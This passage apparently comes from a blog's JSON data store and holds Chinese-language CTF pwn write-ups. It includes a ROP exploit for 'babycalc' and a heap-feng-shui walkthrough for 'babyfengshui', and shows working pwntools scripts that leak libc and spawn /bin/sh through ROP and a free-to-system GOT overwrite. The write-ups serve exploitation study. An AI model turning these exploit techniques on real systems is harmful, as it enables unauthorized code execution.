class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;babycalc&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>():</span><br><span class=\"line\">  p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">try</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#leave=0x0000000000400bb7</span></span><br><span class=\"line\">    ret=<span class=\"number\">0x00000000004005b9</span></span><br><span class=\"line\">    pop_rdi=<span class=\"number\">0x0000000000400ca3</span></span><br><span class=\"line\">    main_func=<span class=\"number\">0x400789</span></span><br><span class=\"line\">    start_addr=<span class=\"number\">0x400650</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># res to equation set</span></span><br><span class=\"line\">    calc_value=p8(<span class=\"number\">19</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">36</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">53</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">70</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">55</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">66</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">17</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">161</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">50</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">131</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">212</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">101</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">118</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">199</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">24</span>)</span><br><span class=\"line\">    calc_value+=p8(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># overwrite value</span></span><br><span class=\"line\">    write_char=<span class=\"string\">&#x27;24&#x27;</span> <span class=\"comment\">#0x18 ret_address=&gt;leave</span></span><br><span class=\"line\">    payload=write_char</span><br><span class=\"line\">    payload=payload.ljust(<span class=\"number\">0x48</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">    payload+=p64(ret)*<span class=\"number\">0x6</span></span><br><span class=\"line\">    payload+=p64(pop_rdi)+p64(elf.got[<span class=\"string\">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>])</span><br><span class=\"line\">    payload+=p64(start_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">    payload=payload.ljust(<span class=\"number\">0xd0</span>,<span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    payload+=calc_value</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    payload=payload.ljust(<span class=\"number\">0xfc</span>,<span class=\"string\">&#x27;c&#x27;</span>)</span><br><span class=\"line\">    payload+=p32(<span class=\"number\">0x38</span>) <span class=\"comment\"># i</span></span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;number-&#x27;</span>+<span class=\"built_in\">str</span>(<span class=\"number\">1</span>)+<span class=\"string\">&#x27;:&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.send(payload)</span><br><span class=\"line\">    </span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;good done\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    puts_addr = u64(p.recvuntil(<span class=\"string\">&#x27;\\x7f&#x27;</span>,timeout=<span class=\"number\">1</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> puts_addr == <span class=\"number\">0</span>:</span><br><span class=\"line\">      <span class=\"keyword\">raise</span> EOFError</span><br><span class=\"line\"></span><br><span class=\"line\">    leak(<span class=\"string\">&quot;puts_addr&quot;</span>,<span class=\"built_in\">hex</span>(puts_addr))</span><br><span class=\"line\">    <span class=\"comment\">#calc libc base</span></span><br><span class=\"line\">    libcbase=puts_addr-libc.symbols[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">    leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">    sys_addr=libcbase+libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">    binsh_addr=libcbase+libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).<span class=\"built_in\">next</span>()</span><br><span class=\"line\">    leak(<span class=\"string\">&#x27;sys_addr&#x27;</span>,<span class=\"built_in\">hex</span>(sys_addr))</span><br><span class=\"line\">    leak(<span class=\"string\">&#x27;binsh_addr&#x27;</span>,<span class=\"built_in\">hex</span>(binsh_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># gdb.attach(p,&#x27;b *0x400bb7&#x27;)</span></span><br><span class=\"line\">    <span class=\"comment\"># pause()</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#get shell </span></span><br><span class=\"line\">    write_char=<span class=\"string\">b&#x27;24&#x27;</span> <span class=\"comment\">#0x18 ret_address=&gt;leave</span></span><br><span class=\"line\">    payload=write_char</span><br><span class=\"line\">    payload=payload.ljust(<span class=\"number\">0x48</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    payload+=p64(ret)*<span class=\"number\">0xd</span></span><br><span class=\"line\">    payload+=p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)</span><br><span class=\"line\">    <span class=\"comment\"># payload=payload.ljust(0xd0 - 0x20 + 8 - 0x10,&#x27;a&#x27;)</span></span><br><span class=\"line\">    <span class=\"comment\"># payload+=p64(ret)+p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    payload=payload.ljust(<span class=\"number\">0xd0</span>,<span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    payload+=calc_value</span><br><span class=\"line\"></span><br><span class=\"line\">    payload=payload.ljust(<span class=\"number\">0xfc</span>,<span class=\"string\">&#x27;c&#x27;</span>)</span><br><span class=\"line\">    payload+=p32(<span class=\"number\">0x38</span>) <span class=\"comment\"># i</span></span><br><span class=\"line\"></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;number-&#x27;</span>+<span class=\"built_in\">str</span>(<span class=\"number\">1</span>)+<span class=\"string\">&#x27;:&#x27;</span>)</span><br><span class=\"line\">    gdb.attach(p,<span class=\"string\">&#x27;b *0x400bb7&#x27;</span>)</span><br><span class=\"line\">    p.send(payload)</span><br><span class=\"line\">    </span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;good done\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.interactive()</span><br><span class=\"line\">    <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">except</span> EOFError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    p.close()</span><br><span class=\"line\">    <span class=\"keyword\">raise</span> e</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># pwn()</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">  <span class=\"keyword\">try</span>:</span><br><span class=\"line\">    pwn()</span><br><span class=\"line\">    <span class=\"keyword\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">except</span> EOFError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"babyfengshui","date":"2023-01-02T11:54:26.000Z","_content":"这是一个32位的堆题，堆风水。\n<!-- more -->\n\n查壳\n![check](C:\\Users\\95368\\Documents\\GitHub\\pwn-study-diary\\wp\\babyfengshui\\picture\\check.png)\n\n\n是一个菜单，里面的user结构大概如下：\n\n```c\nstruct user\n{\n    char* description;//根据输入的size申请\n    char name[124];\n}\n//在申请的0x80的chunk（user）中，第一个4byte是description的指针，后面存放的是name\n```\n\n在update函数中，有一个对堆溢出的检测\n\n```c\n// 防止description的chunk溢出到该userchunk的size，但是可以溢出到pre_size\n// 而且可能只有一开始chunk比较整齐的时候有用，若经过申请和释放description和user的chunk不连续，则失效\nif ( (char *)(length + *(_DWORD *)*(&ptr + index)) >= (char *)*(&ptr + index) - 4 )\n{                                           \n  puts(\"my l33t defenses cannot be fooled, cya!\");\n  exit(1);\n}\n\n```\n\nif中条件的意思是：description中写的范围最多到该description的user的size位前。\n\n由于在add user的函数中，先malloc的是description的chunk，因此可以防止update时溢出到user的size以及后面的数据。\n\n但是，如果先申请的user被delete了，释放的user和description可能会在后续的过程中（甚至释放的时候）被合并，那么在后面申请新的user时，若合并后的部分不足以容纳新的description和user，则会造成description和其user并不连续，该防护就会不起作用，而我们要做的就是造成这种合并。\n\n**consolidate的机制（合并）**\n\n在malloc和free的时候都可能会出现合并的情况\n\n**malloc的情况：**\n\nmalloc中的合并通常都是调用malloc_consolidate()函数对fast bins进行整理。当在small bins中查找时，若small bins尚未初始化，则合并fast bins中的chunk。当fast bins 和 small bins 中的chunk的大小都不能满足时，在large bins中查找，首先会调用malloc_consolidate()对进行fast bins chunk进行合并，可以合并的合并后放到unsorted bin，不能合并的直接放到unsorted bin中。如果top chunk也不能满足需求，会先调用malloc_consolidate()对fast bins chunk进行合并后再重新进行一次分配。\n\nmalloc_consolidate()有两个作用：1.若fast bins未初始化，则初始化malloc_state;2.否则，合并fast bins中的chunk。\n\n**free的情况：**\n\n如果**chunk的大小不在fast bin的范围内**，free会尝试进行合并。合并首先考虑与**物理低地址**的相邻空闲chunk，再考虑**物理高地址**的相邻空闲chunk（两个chunk都不能是top chunk）。如果下一个chunk是top chunk，则当前chunk会合并到top chunk，并修改top chunk的大小。\n\n如果合并后的 chunk 大小大于 64KB，并且 fast bins 中存在空闲 chunk，调用 malloc_consolidate()函数合并 fast bins 中的空闲 chunk 到 unsorted bin 中。\n\n对chunk进行合理的布局后，经过恰当的释放和申请，让新申请的description和user不连续，则可以在update函数实现堆溢出，在update函数中，从user的前4byte（description）指向的位置开始，可以写到该user的size字段前。\n\n\n在知道了这些之后，首先要考虑怎样才能**泄露libc**。\n\n在这道题目中，有display的功能，可以输出description的内容。其具体的过程是利用printf函数输出user的第一个4byte所指向的内容。这里原本存放的是description的指针，如果通过堆溢出将其**修改为got表项的地址**，则可以输出一个函数的真实地址，并由此得到libc。\n\n得到libc之后，就可以考虑如何**get shell**。\n\n在update中我们可以注意到，写入description是写入user的前4byte指向的位置。在一般情况下，这个指针指向的是description，但在我们泄露libc的过程中，我们其实是可以对其他user的description指针所在位置进行修改的。如果我们对这个指针修改后再执行update，对写入该指针指向的位置，利用这点，我们可以将某一函数的got表项覆盖为system函数。\n\n在此时，free函数就是个不错的选择，在delete user的时候，对调用free对user前四位指向的chunk进行释放，如果我们将free修改为system函数，并将要free的user的description设置为\"/bin/sh\\x00\"，则可以执行system(\"/bin/sh\\x00\")。\n\nexp：\n\n```python\nfrom pwn import*\nfrom LibcSearcher import*\nelf=ELF(\"./babyfengshui\")\n#p=process(\"./babyfengshui\")\np=remote('node4.buuoj.cn',28361)\ncontext.log_level='debug'\n\ndef add_user(size,name,length,text):\n  p.recvuntil('Action: ')\n\tp.sendline('0')\n\tp.recvuntil('size of description: ')\n\tp.sendline(str(size))\n\tp.recvuntil('name: ')\n\tp.sendline(str(name))\n\tp.recvuntil('text length: ')\n\tp.sendline(str(length))\n\tp.recvuntil('text: ')\n\tp.sendline(text)\n\ndef del_user(idx):\n\tp.recvuntil('Action: ')\n\tp.sendline('1')\n\tp.recvuntil('index: ')\n\tp.sendline(str(idx))\n\ndef display(idx):\n\tp.recvuntil('Action: ')\n\tp.sendline('2')\n\tp.recvuntil('index: ')\n\tp.sendline(str(idx))\n\ndef update(idx,length,text):\n\tp.recvuntil('Action: ')\n\tp.sendline('3')\n\tp.recvuntil('index: ')\n\tp.sendline(str(idx))\n\tp.recvuntil('text length: ')\n\tp.sendline(str(length))\n\tp.recvuntil('text: ')\n\tp.sendline(text)\n\n\nadd_user(0x80,'chunk0',0x80,'nothing')\nadd_user(0x80,'chunk1',0x80,'nothing')\nadd_user(0x8,'chunk2',0x8,'/bin/sh\\x00')\ndel_user(0)\n\nprint ('this is got : ' + hex(elf.got['free']))\n\n#gdb.attach(p)\n\nadd_user(0x108,'chunk0_0',0x19c,'a'*0x198+p32(elf.got['free']))\n\ndisplay(1)\np.recvuntil('description: ')\ndata=u32(p.recv(4))\nprint hex(data)\n\nlibc=LibcSearcher('free',data)\nlibcbase=data-libc.dump('free')\nprint libcbase\n\nsys=libcbase+libc.dump('system')\n\nupdate(1,4,p32(sys))\ndel_user(2)\n\np.interactive()\n```\n\n","source":"_posts/babyfengshui.md","raw":"---\ntitle: babyfengshui\ndate: 2023-01-02 19:54:26\ncategories: \n- pwn_wp\ntags: \n- pwn\n- heap\n---\n这是一个32位的堆题，堆风水。\n<!-- more -->\n\n查壳\n![check](C:\\Users\\95368\\Documents\\GitHub\\pwn-study-diary\\wp\\babyfengshui\\picture\\check.png)\n\n\n是一个菜单，里面的user结构大概如下：\n\n```c\nstruct user\n{\n    char* description;//根据输入的size申请\n    char name[124];\n}\n//在申请的0x80的chunk（user）中，第一个4byte是description的指针，后面存放的是name\n```\n\n在update函数中，有一个对堆溢出的检测\n\n```c\n// 防止description的chunk溢出到该userchunk的size，但是可以溢出到pre_size\n// 而且可能只有一开始chunk比较整齐的时候有用，若经过申请和释放description和user的chunk不连续，则失效\nif ( (char *)(length + *(_DWORD *)*(&ptr + index)) >= (char *)*(&ptr + index) - 4 )\n{                                           \n  puts(\"my l33t defenses cannot be fooled, cya!\");\n  exit(1);\n}\n\n```\n\nif中条件的意思是：description中写的范围最多到该description的user的size位前。\n\n由于在add user的函数中，先malloc的是description的chunk，因此可以防止update时溢出到user的size以及后面的数据。\n\n但是，如果先申请的user被delete了，释放的user和description可能会在后续的过程中（甚至释放的时候）被合并，那么在后面申请新的user时，若合并后的部分不足以容纳新的description和user，则会造成description和其user并不连续，该防护就会不起作用，而我们要做的就是造成这种合并。\n\n**consolidate的机制（合并）**\n\n在malloc和free的时候都可能会出现合并的情况\n\n**malloc的情况：**\n\nmalloc中的合并通常都是调用malloc_consolidate()函数对fast bins进行整理。当在small bins中查找时，若small bins尚未初始化，则合并fast bins中的chunk。当fast bins 和 small bins 中的chunk的大小都不能满足时，在large bins中查找，首先会调用malloc_consolidate()对进行fast bins chunk进行合并，可以合并的合并后放到unsorted bin，不能合并的直接放到unsorted bin中。如果top chunk也不能满足需求，会先调用malloc_consolidate()对fast bins chunk进行合并后再重新进行一次分配。\n\nmalloc_consolidate()有两个作用：1.若fast bins未初始化，则初始化malloc_state;2.否则，合并fast bins中的chunk。\n\n**free的情况：**\n\n如果**chunk的大小不在fast bin的范围内**，free会尝试进行合并。合并首先考虑与**物理低地址**的相邻空闲chunk，再考虑**物理高地址**的相邻空闲chunk（两个chunk都不能是top chunk）。如果下一个chunk是top chunk，则当前chunk会合并到top chunk，并修改top chunk的大小。\n\n如果合并后的 chunk 大小大于 64KB，并且 fast bins 中存在空闲 chunk，调用 malloc_consolidate()函数合并 fast bins 中的空闲 chunk 到 unsorted bin 中。\n\n对chunk进行合理的布局后，经过恰当的释放和申请，让新申请的description和user不连续，则可以在update函数实现堆溢出，在update函数中，从user的前4byte（description）指向的位置开始，可以写到该user的size字段前。\n\n\n在知道了这些之后，首先要考虑怎样才能**泄露libc**。\n\n在这道题目中，有display的功能，可以输出description的内容。其具体的过程是利用printf函数输出user的第一个4byte所指向的内容。这里原本存放的是description的指针，如果通过堆溢出将其**修改为got表项的地址**，则可以输出一个函数的真实地址，并由此得到libc。\n\n得到libc之后，就可以考虑如何**get shell**。\n\n在update中我们可以注意到，写入description是写入user的前4byte指向的位置。在一般情况下，这个指针指向的是description，但在我们泄露libc的过程中，我们其实是可以对其他user的description指针所在位置进行修改的。如果我们对这个指针修改后再执行update，对写入该指针指向的位置，利用这点，我们可以将某一函数的got表项覆盖为system函数。\n\n在此时，free函数就是个不错的选择，在delete user的时候，对调用free对user前四位指向的chunk进行释放，如果我们将free修改为system函数，并将要free的user的description设置为\"/bin/sh\\x00\"，则可以执行system(\"/bin/sh\\x00\")。\n\nexp：\n\n```python\nfrom pwn import*\nfrom LibcSearcher import*\nelf=ELF(\"./babyfengshui\")\n#p=process(\"./babyfengshui\")\np=remote('node4.buuoj.cn',28361)\ncontext.log_level='debug'\n\ndef add_user(size,name,length,text):\n  p.recvuntil('Action: ')\n\tp.sendline('0')\n\tp.recvuntil('size of description: ')\n\tp.sendline(str(size))\n\tp.recvuntil('name: ')\n\tp.sendline(str(name))\n\tp.recvuntil('text length: ')\n\tp.sendline(str(length))\n\tp.recvuntil('text: ')\n\tp.sendline(text)\n\ndef del_user(idx):\n\tp.recvuntil('Action: ')\n\tp.sendline('1')\n\tp.recvuntil('index: ')\n\tp.sendline(str(idx))\n\ndef display(idx):\n\tp.recvuntil('Action: ')\n\tp.sendline('2')\n\tp.recvuntil('index: ')\n\tp.sendline(str(idx))\n\ndef update(idx,length,text):\n\tp.recvuntil('Action: ')\n\tp.sendline('3')\n\tp.recvuntil('index: ')\n\tp.sendline(str(idx))\n\tp.recvuntil('text length: ')\n\tp.sendline(str(length))\n\tp.recvuntil('text: ')\n\tp.sendline(text)\n\n\nadd_user(0x80,'chunk0',0x80,'nothing')\nadd_user(0x80,'chunk1',0x80,'nothing')\nadd_user(0x8,'chunk2',0x8,'/bin/sh\\x00')\ndel_user(0)\n\nprint ('this is got : ' + hex(elf.got['free']))\n\n#gdb.attach(p)\n\nadd_user(0x108,'chunk0_0',0x19c,'a'*0x198+p32(elf.got['free']))\n\ndisplay(1)\np.recvuntil('description: ')\ndata=u32(p.recv(4))\nprint hex(data)\n\nlibc=LibcSearcher('free',data)\nlibcbase=data-libc.dump('free')\nprint libcbase\n\nsys=libcbase+libc.dump('system')\n\nupdate(1,4,p32(sys))\ndel_user(2)\n\np.interactive()\n```\n\n","slug":"babyfengshui","published":1,"updated":"2023-01-02T13:53:56.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafo002i5oudbpq4a57v","content":"<p>这是一个32位的堆题，堆风水。</p>\n<span id=\"more\"></span>\n\n<p>查壳<br><img src=\"C:\\Users\\95368\\Documents\\GitHub\\pwn-study-diary\\wp\\babyfengshui\\picture\\check.png\" alt=\"check\"></p>\n<p>是一个菜单，里面的user结构大概如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">user</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">char</span>* description;<span class=\"comment\">//根据输入的size申请</span></span><br><span class=\"line\">    <span class=\"type\">char</span> name[<span class=\"number\">124</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//在申请的0x80的chunk（user）中，第一个4byte是description的指针，后面存放的是name</span></span><br></pre></td></tr></table></figure>\n\n<p>在update函数中，有一个对堆溢出的检测</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 防止description的chunk溢出到该userchunk的size，但是可以溢出到pre_size</span></span><br><span class=\"line\"><span class=\"comment\">// 而且可能只有一开始chunk比较整齐的时候有用，若经过申请和释放description和user的chunk不连续，则失效</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( (<span class=\"type\">char</span> *)(length + *(_DWORD *)*(&amp;ptr + index)) &gt;= (<span class=\"type\">char</span> *)*(&amp;ptr + index) - <span class=\"number\">4</span> )</span><br><span class=\"line\">&#123;                                           </span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;my l33t defenses cannot be fooled, cya!&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>if中条件的意思是：description中写的范围最多到该description的user的size位前。</p>\n<p>由于在add user的函数中，先malloc的是description的chunk，因此可以防止update时溢出到user的size以及后面的数据。</p>\n<p>但是，如果先申请的user被delete了，释放的user和description可能会在后续的过程中（甚至释放的时候）被合并，那么在后面申请新的user时，若合并后的部分不足以容纳新的description和user，则会造成description和其user并不连续，该防护就会不起作用，而我们要做的就是造成这种合并。</p>\n<p><strong>consolidate的机制（合并）</strong></p>\n<p>在malloc和free的时候都可能会出现合并的情况</p>\n<p><strong>malloc的情况：</strong></p>\n<p>malloc中的合并通常都是调用malloc_consolidate()函数对fast bins进行整理。当在small bins中查找时，若small bins尚未初始化，则合并fast bins中的chunk。当fast bins 和 small bins 中的chunk的大小都不能满足时，在large bins中查找，首先会调用malloc_consolidate()对进行fast bins chunk进行合并，可以合并的合并后放到unsorted bin，不能合并的直接放到unsorted bin中。如果top chunk也不能满足需求，会先调用malloc_consolidate()对fast bins chunk进行合并后再重新进行一次分配。</p>\n<p>malloc_consolidate()有两个作用：1.若fast bins未初始化，则初始化malloc_state;2.否则，合并fast bins中的chunk。</p>\n<p><strong>free的情况：</strong></p>\n<p>如果<strong>chunk的大小不在fast bin的范围内</strong>，free会尝试进行合并。合并首先考虑与<strong>物理低地址</strong>的相邻空闲chunk，再考虑<strong>物理高地址</strong>的相邻空闲chunk（两个chunk都不能是top chunk）。如果下一个chunk是top chunk，则当前chunk会合并到top chunk，并修改top chunk的大小。</p>\n<p>如果合并后的 chunk 大小大于 64KB，并且 fast bins 中存在空闲 chunk，调用 malloc_consolidate()函数合并 fast bins 中的空闲 chunk 到 unsorted bin 中。</p>\n<p>对chunk进行合理的布局后，经过恰当的释放和申请，让新申请的description和user不连续，则可以在update函数实现堆溢出，在update函数中，从user的前4byte（description）指向的位置开始，可以写到该user的size字段前。</p>\n<p>在知道了这些之后，首先要考虑怎样才能<strong>泄露libc</strong>。</p>\n<p>在这道题目中，有display的功能，可以输出description的内容。其具体的过程是利用printf函数输出user的第一个4byte所指向的内容。这里原本存放的是description的指针，如果通过堆溢出将其<strong>修改为got表项的地址</strong>，则可以输出一个函数的真实地址，并由此得到libc。</p>\n<p>得到libc之后，就可以考虑如何<strong>get shell</strong>。</p>\n<p>在update中我们可以注意到，写入description是写入user的前4byte指向的位置。在一般情况下，这个指针指向的是description，但在我们泄露libc的过程中，我们其实是可以对其他user的description指针所在位置进行修改的。如果我们对这个指针修改后再执行update，对写入该指针指向的位置，利用这点，我们可以将某一函数的got表项覆盖为system函数。</p>\n<p>在此时，free函数就是个不错的选择，在delete user的时候，对调用free对user前四位指向的chunk进行释放，如果我们将free修改为system函数，并将要free的user的description设置为”/bin/sh\\x00”，则可以执行system(“/bin/sh\\x00”)。</p>\n<p>exp：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span>*</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./babyfengshui&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=process(&quot;./babyfengshui&quot;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">28361</span>)</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add_user</span>(<span class=\"params\">size,name,length,text</span>):</span><br><span class=\"line\">  p.recvuntil(<span class=\"string\">&#x27;Action: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;0&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;size of description: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;name: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(name))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;text length: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;text: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">del_user</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Action: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span 